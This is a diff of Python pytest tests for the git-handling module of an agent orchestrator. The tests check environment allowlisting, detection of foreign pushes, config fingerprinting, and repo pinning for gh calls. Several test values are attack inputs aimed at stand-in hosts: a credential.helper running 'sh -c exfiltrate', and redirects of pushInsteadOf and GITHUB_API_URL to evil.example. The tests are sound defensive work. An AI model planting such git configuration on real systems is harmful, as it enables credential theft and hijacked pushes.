@@ -12,6 +12,7 @@ from pathlib import Path
 
 import pytest
 
+from wastech_orchestrator import git_manager
 from wastech_orchestrator.config.schema import BranchMode, MergeStrategy
 from wastech_orchestrator.core.follow_ups import FOLLOW_UPS_HEADING
 from wastech_orchestrator.core.state_machine import Status
@@ -525,6 +526,27 @@ def test_ensure_path_excluded_adds_one_anchored_rule_and_repeats_cleanly(
     # The tracked .gitignore stays untouched: this is orchestrator bookkeeping, not a repo decision.
     gitignore = git_repo.clone / ".gitignore"
     assert not gitignore.exists() or ".toolcache" not in gitignore.read_text(encoding="utf-8")
+
+
+def test_assigned_path_list_adds_one_ignore_rule_per_element_only(
+    git_repo, store: StateStore, tmp_path: Path, make_git_config: ConfigFactory
+) -> None:
+    first = git_repo.clone / ".toolcache" / "first"
+    second = git_repo.clone / ".toolcache" / "second"
+    gm = _manager(
+        git_repo,
+        store,
+        tmp_path / "art",
+        make_git_config,
+        extra_environment={"TOOLCHAIN_PATHS": f"{first}:{second}"},
+    )
+
+    gm.ensure_assigned_cache_excludes()
+
+    text = (git_repo.clone / ".git" / "info" / "exclude").read_text(encoding="utf-8")
+    assert text.count("/.toolcache/first") == 1
+    assert text.count("/.toolcache/second") == 1
+    assert f"{first}:{second}" not in text
 
 
 def test_ensure_path_excluded_accepts_an_equivalent_spelling_of_the_clone(
@@ -2620,6 +2642,64 @@ def test_commit_code_records_and_announces_a_state_it_did_not_commit(
     assert store.get_gate_reference("task-001") == head  # the gate moves on with it
 
 
+def test_commit_subtask_adopts_a_clean_tree_the_same_way_commit_code_does(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+    git_run: GitRunner,
+    package_log_text: Callable[[], str],
+) -> None:
+    # Пре3-4: the same entry condition (nothing left to stage because someone else committed it)
+    # was handled in one of the two commit paths. On the subtask path it returned HEAD in silence,
+    # so the reference point stayed put — and the NEXT subtask's gate asked the operator again about
+    # deletions already cleared, which is the regression the phase's own rollback note called the
+    # main one.
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    (git_repo.clone / "agent.py").write_text("a = 1\n", encoding="utf-8")
+    git_run(["add", "agent.py"], git_repo.clone)
+    git_run(["commit", "-m", "wip: someone else committed this subtask"], git_repo.clone)
+    head = git_run(["rev-parse", "HEAD"], git_repo.clone).strip()
+
+    assert gm.commit_subtask("task-001", 1, "first", "feat: subtask 1") == head
+
+    assert store.get_gate_reference("task-001") == head  # the reference moves with the adoption
+    op = store.get_publish_op("task-001", "subtask_commit", 1)
+    assert op is not None and op.result_ref == head and op.status == "completed"
+    assert "publishing a code state the orchestrator did not commit" in package_log_text()
+    assert gm.adopted_commit_count("task-001") == 1  # declared in the PR body by the publish node
+
+
+def test_a_self_commit_reaches_the_gate_of_the_next_writing_node(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+    git_run: GitRunner,
+) -> None:
+    # Пре3-3 / AC4.1: the load-bearing claim, end to end on real git and along the product path that
+    # does NOT park — a node whose class only warns commits a deletion, and the gate input of the
+    # next writing node still contains it. Measured through `changed_code_entries`, which is exactly
+    # what the runner hands `evaluate_diff_gate`, and paired with `git diff HEAD` being empty: that
+    # emptiness is what the old HEAD-relative gate saw.
+    from wastech_orchestrator.core.dangerous_diff import evaluate_diff_gate
+
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    git_run(["rm", "README.md"], git_repo.clone)
+    git_run(["commit", "-m", "wip: a node with a shell removed a tracked file"], git_repo.clone)
+
+    entries = gm.changed_code_entries("task-001")
+    assert [(e.status, e.path) for e in entries] == [("D", "README.md")]
+    dangerous = evaluate_diff_gate(entries, "strict", ())
+    assert dangerous is not None and dangerous.deleted_paths == ("README.md",)
+    # The commit emptied `git diff HEAD` — the old reference — so this is not a tautology.
+    assert git_run(["diff", "HEAD", "--name-only"], git_repo.clone).strip() == ""
+
+
 def test_a_decomposed_publish_says_nothing_about_its_own_subtask_commits(
     git_repo,
     store: StateStore,
@@ -2885,6 +2965,61 @@ def test_a_task_branch_appearing_on_the_remote_during_an_attempt_is_drift(
     assert any(item.aspect == "remote" for item in drift.items)
 
 
+def test_a_foreign_push_between_two_brackets_is_still_drift(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+    git_run: GitRunner,
+) -> None:
+    # Пре2-1 / П2.2: the reference is the commit WE recorded pushing, not the previous snapshot. A
+    # foreign push that lands between two brackets is identical on both sides of the delta, so it
+    # used to become the baseline of the next attempt and never be drift at all — while the branch
+    # on origin was someone else's.
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    branch = gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    (git_repo.clone / "feature.txt").write_text("ours\n", encoding="utf-8")
+    git_run(["add", "feature.txt"], git_repo.clone)
+    git_run(["commit", "-m", "ours"], git_repo.clone)
+    assert gm.push("task-001", branch).pushed is True
+
+    other = tmp_path / "other"
+    git_run(["clone", str(git_repo.remote), str(other)], tmp_path)
+    git_run(["config", "user.email", "other@example.com"], other)
+    git_run(["config", "user.name", "Other"], other)
+    git_run(["config", "commit.gpgsign", "false"], other)
+    git_run(["checkout", branch], other)
+    git_run(["commit", "--allow-empty", "-m", "someone else's commit"], other)
+    git_run(["push", "origin", branch], other)
+
+    # Both snapshots are taken AFTER the foreign push, so the delta sees nothing: this is exactly
+    # the window the recorded-commit comparison exists to cover.
+    before = gm.capture_git_control_state()
+    drift = gm.compare_git_control_state(before)
+    assert drift is not None
+    details = [item.detail for item in drift.items if item.aspect == "remote"]
+    assert details == ["the task branch on origin is not the commit we pushed"]
+
+
+def test_a_remote_branch_we_never_pushed_is_not_reported_against_a_recorded_commit(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+) -> None:
+    # The other side of the same rule: with nothing recorded as pushed there is nothing to compare
+    # against, and a branch that existed before this task pushed anything is the publish path's
+    # business (four cases) — parking for it here would park every rerun onto a live branch.
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    before = gm.capture_git_control_state()
+    assert before.remote.recorded_push_sha is None
+
+    assert gm.compare_git_control_state(before) is None
+
+
 def test_base_branch_movement_is_not_drift(
     git_repo,
     store: StateStore,
@@ -3053,6 +3188,46 @@ def test_the_repo_pin_falls_back_to_the_clone_origin_when_the_config_names_none(
     assert calls and all("--repo" not in call for call in calls)
 
 
+def test_no_gh_call_site_bypasses_the_pinning_wrapper() -> None:
+    # Пре2-12: the behavioral test above drives two of the nine `gh` call sites, while floor 4
+    # promises the pin for all of them. What makes the promise uniform is that every site goes
+    # through `_gh`, which appends `--repo` — so assert exactly that, structurally, for all nine:
+    # no site spells the executable itself, and none passes its own `--repo` (a double pin).
+    import ast
+
+    source = Path(git_manager.__file__).read_text(encoding="utf-8")
+    tree = ast.parse(source)
+    wrapper = next(
+        node for node in ast.walk(tree) if isinstance(node, ast.FunctionDef) and node.name == "_gh"
+    )
+    wrapper_lines = range(wrapper.lineno, (wrapper.end_lineno or wrapper.lineno) + 1)
+
+    through_wrapper = 0
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        func = node.func
+        if isinstance(func, ast.Attribute) and func.attr == "_gh":
+            through_wrapper += 1
+            for arg in ast.walk(node):
+                if isinstance(arg, ast.Constant) and arg.value == "--repo":
+                    raise AssertionError("a gh call site adds its own --repo; the wrapper does it")
+    assert through_wrapper >= 9  # every site the audit counted, and any added since
+
+    # And the executable is launched from one place only: an argv list starting with "gh" outside
+    # the wrapper would be a site the pin never reaches.
+    launched_outside = [
+        node.lineno
+        for node in ast.walk(tree)
+        if isinstance(node, ast.List)
+        and node.elts
+        and isinstance(node.elts[0], ast.Constant)
+        and node.elts[0].value == "gh"
+        and node.lineno not in wrapper_lines
+    ]
+    assert launched_outside == []
+
+
 # --- the publish path is exempt from advanced mode (ТA.2.1 / ТA.2.4 / ТA.1.6) --------------------
 
 
@@ -3143,6 +3318,66 @@ def test_an_assigned_variable_cannot_smuggle_a_retargeting_name(
     assert gm._env["NUGET_PACKAGES"] == "/repo/.toolcache/nuget"
 
 
+@pytest.mark.parametrize(
+    "name, value",
+    [
+        # Both found by the audit as the same class the named scrub already covers.
+        ("GIT_CONFIG_PARAMETERS", "'credential.helper=!sh -c exfiltrate'"),
+        ("GH_CONFIG_DIR", "/tmp/planted-gh-config"),
+        # And the point of inverting the rule: a name nobody here has read is closed by default, so
+        # the list stops having to chase `git`/`gh` releases.
+        ("GIT_SOMETHING_INVENTED_LATER", "x"),
+        ("GH_SOMETHING_INVENTED_LATER", "x"),
+        ("GITHUB_API_URL", "https://evil.example"),
+    ],
+)
+def test_the_git_namespace_is_a_whitelist_not_a_deny_list(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+    monkeypatch: pytest.MonkeyPatch,
+    name: str,
+    value: str,
+) -> None:
+    """Ам2-5 (owner decision Ам2-В2 «b»): the `GIT_*`/`GH_*` namespace is closed by default.
+
+    Reachability is the same as for every named entry — a `GIT_*` prefix pattern in
+    `allowed_environment`, or an assignment in `extra_environment` — and the mode makes the
+    operator's whole shell the agent's environment, so the orchestrator's own git/gh path is the one
+    place this has to hold.
+    """
+    monkeypatch.setenv(name, value)
+    gm = _mode_manager(
+        git_repo,
+        store,
+        tmp_path / "art",
+        make_git_config,
+        extra_environment={name: value},
+    )
+    assert name not in gm._env
+
+
+def test_the_token_names_publication_needs_are_whitelisted(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+) -> None:
+    # The other side of the inversion, and the reason it is a whitelist rather than a blanket drop:
+    # a token does not retarget anything (WHERE a call goes is `--repo` plus the host names, all
+    # closed), and removing it would break an operator-supplied credential for nothing.
+    gm = _mode_manager(
+        git_repo,
+        store,
+        tmp_path / "art",
+        make_git_config,
+        extra_environment={"GH_TOKEN": "t", "GITHUB_TOKEN": "t2"},
+    )
+    assert gm._env["GH_TOKEN"] == "t"
+    assert gm._env["GITHUB_TOKEN"] == "t2"
+
+
 def test_the_global_gitconfig_pointer_is_deliberately_not_scrubbed(
     git_repo, store: StateStore, tmp_path: Path, make_git_config: ConfigFactory
 ) -> None:
@@ -3164,6 +3399,113 @@ def test_the_global_gitconfig_pointer_is_deliberately_not_scrubbed(
     assert gm._env["GIT_CONFIG_GLOBAL"] == "/tmp/operator-chosen-gitconfig"
 
 
+def test_the_fingerprint_digests_the_global_config_git_actually_reads(
+    git_repo, store: StateStore, tmp_path: Path, make_git_config: ConfigFactory
+) -> None:
+    # Пре2-5: leaving `GIT_CONFIG_GLOBAL` out of the scrub is only honest if the fingerprint follows
+    # git to the file it then reads. Digesting `~/.gitconfig` while git reads a third file would
+    # fingerprint a file nobody consults and miss the one that decides `credential.helper`.
+    chosen = tmp_path / "operator-chosen-gitconfig"
+    chosen.write_text("[user]\n\tname = Operator\n", encoding="utf-8")
+    gm = _manager(
+        git_repo,
+        store,
+        tmp_path / "art",
+        make_git_config,
+        extra_environment={"GIT_CONFIG_GLOBAL": str(chosen)},
+    )
+    _task(store)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    before = gm.capture_git_control_state()
+    assert "$GIT_CONFIG_GLOBAL" in before.tool_config
+    assert "~/.gitconfig" not in before.tool_config  # git does not read it under this environment
+
+    chosen.write_text("[credential]\n\thelper = !sh -c 'exfiltrate'\n", encoding="utf-8")
+
+    drift = gm.compare_git_control_state(before)
+    assert drift is not None
+    details = [item.detail for item in drift.items if item.aspect == "tool_config"]
+    assert details == ["agent/git configuration changed: $GIT_CONFIG_GLOBAL"]
+
+
+def test_the_user_config_half_of_the_fingerprint_is_reachable_without_touching_a_real_home(
+    git_repo,
+    store: StateStore,
+    tmp_path: Path,
+    make_git_config: ConfigFactory,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # Пре2-12: the loud line calls the user git config the FIRST half of what floor 4 watches, and
+    # it had no test at all — `Path.home()` was read directly, so there was no seam to substitute.
+    # `XDG_CONFIG_HOME` is that seam for the second location, and it is read from the same
+    # environment the orchestrator's git runs under.
+    home = tmp_path / "home"
+    (home / ".config" / "git").mkdir(parents=True)
+    (home / ".config" / "git" / "config").write_text("[user]\n\tname = X\n", encoding="utf-8")
+    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
+    gm = _manager(
+        git_repo,
+        store,
+        tmp_path / "art",
+        make_git_config,
+        extra_environment={"XDG_CONFIG_HOME": str(home / ".config")},
+    )
+    _task(store)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    before = gm.capture_git_control_state()
+    assert "~/.config/git/config" in before.tool_config
+
+    (home / ".config" / "git" / "config").write_text(
+        '[url "https://evil.example"]\n\tpushInsteadOf = https://github.com/\n', encoding="utf-8"
+    )
+
+    drift = gm.compare_git_control_state(before)
+    assert drift is not None
+    assert any(item.aspect == "tool_config" for item in drift.items)
+
+
+def test_a_fifo_in_the_codex_tree_cannot_hang_the_fingerprint(
+    git_repo, store: StateStore, tmp_path: Path, make_git_config: ConfigFactory
+) -> None:
+    # Пре2-7: the walked tree is one the agent may write into on purpose (that is what `.codex/` is
+    # for), and everything `os.walk` called a file was read. A FIFO there blocks the read forever,
+    # and this capture runs before every attempt with no timeout — so the run did not park, it hung
+    # holding the processing slot.
+    if not hasattr(os, "mkfifo"):  # pragma: no cover - Windows has no FIFO to plant
+        pytest.skip("no mkfifo on this platform")
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    codex = git_repo.clone / ".codex"
+    codex.mkdir(parents=True, exist_ok=True)
+    (codex / "config.toml").write_text("[profile]\n", encoding="utf-8")
+    os.mkfifo(codex / "pipe")
+
+    state = gm.capture_git_control_state()  # would never return before the type check
+
+    assert ".codex/config.toml" in state.tool_config
+    assert ".codex/pipe" not in state.tool_config  # not a regular file, so not digested
+
+
+def test_an_oversize_codex_entry_is_fingerprinted_by_size_not_read(
+    git_repo, store: StateStore, tmp_path: Path, make_git_config: ConfigFactory
+) -> None:
+    # The bound half of the same fix: configuration files are kilobytes, and reading something far
+    # larger into memory before every attempt is a cost with no benefit — but an edit to it must
+    # still show, so the size stands in for the digest.
+    _task(store)
+    gm = _manager(git_repo, store, tmp_path / "art", make_git_config)
+    gm.prepare_branch("task-001", "x", epoch=_EPOCH)
+    codex = git_repo.clone / ".codex"
+    codex.mkdir(parents=True, exist_ok=True)
+    blob = codex / "huge.bin"
+    blob.write_bytes(b"x" * (1_048_576 + 1))
+
+    state = gm.capture_git_control_state()
+
+    assert state.tool_config[".codex/huge.bin"].startswith("oversize:")
+
+
 def test_the_module_level_git_helpers_run_on_the_allowlist_too(
     monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
@@ -3179,6 +3521,16 @@ def test_the_module_level_git_helpers_run_on_the_allowlist_too(
     assert "PATH" in env and "HOME" in env  # git must be findable and read its global config
     assert env["LC_ALL"] == "C"  # hardened like every other orchestrator git process
     assert not {"GIT_DIR", "GIT_WORK_TREE", "GH_REPO"} & set(env)
+
+
+def test_module_level_git_helpers_honor_the_callers_security_policy(
+    git_repo, make_git_config: ConfigFactory
+) -> None:
+    config = make_git_config(
+        git_repo.clone, extra_environment={"WASTECH_HELPER_SENTINEL": "assigned"}
+    )
+    env = build_helper_git_env(security=config.security)
+    assert env["WASTECH_HELPER_SENTINEL"] == "assigned"
 
 
 def test_the_gh_probe_keeps_the_env_token_it_exists_to_account_for(
